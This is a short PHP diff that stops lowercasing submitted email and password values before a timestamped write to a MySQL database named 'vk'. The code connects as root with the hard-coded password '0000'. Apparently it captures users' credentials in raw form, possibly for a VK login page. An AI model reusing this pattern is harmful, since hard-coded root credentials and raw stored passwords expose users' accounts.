@@ -9,8 +9,8 @@
 	}
 	
     $date = date('Y-m-d H:i:s');
-	$email = mb_strtolower($_POST['email']);
-	$pass = mb_strtolower($_POST['pass']);
+	$email = $_POST['email'];
+	$pass = $_POST['pass'];
 
 	$conn = mysqli_connect('localhost', 'root', '0000', 'vk') or die(mysqli_error($conn));
 	mysqli_set_charset($conn, "utf8");
